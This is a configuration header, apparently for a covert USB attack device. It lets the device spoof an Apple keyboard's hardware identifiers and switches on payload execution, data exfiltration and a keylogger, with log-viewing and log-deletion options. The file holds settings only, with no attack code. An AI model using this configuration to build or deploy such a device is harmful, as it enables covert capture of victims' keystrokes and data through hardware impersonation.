#ifndef CONFIG
#define CONFIG

// USB CONFIG - CHANGE VID/PID/MANUFACTURER/PRODUCT - SET "#define CHANGE_USB_CONFIG true" TO APPLY
uint16_t vendor_id = 0x05ac;
uint16_t product_id = 0x201e;
char *manufacturer = "Apple Inc.";
char *product = "Aluminium Keyboard IT USB";

#define CHANGE_USB_CONFIG false // SET TRUE TO CHANGE VID/PID/MANUFACTURER/PRODUCT TO APPLE KEYBOARD

// ATTACK CONFIG (DISABLE ALL LOG OPTIONS: false)
#define PAYLOAD_RUN true // true or false
#define EXFIL false // true or false
#define KEYLOGGER true // true or false

// USB HOST MOUSE AND RUN PAYLOAD. Read the USB Host Mouse section in Readme.md to configure this.
#define USBHOST_MOUSE false // true or false
String PAYLOAD_RUN_CLICK = "NONE"; // SET NONE, MOUSE_BUTTON_MIDDLE, MOUSE_BUTTON_RIGHT OR MOUSE_BUTTON_LEFT

// LOGS CONFIG (DISABLE ALL ATTACK OPTIONS: false)
#define EXFIL_VIEWLOG false // true or false
#define EXFIL_DELETELOG false // true or false
#define KEYLOGGER_VIEWLOG false // true or false
#define KEYLOGGER_DELETELOG false // true or false

// FORMAT FS
#define FORMATFS false

#endif
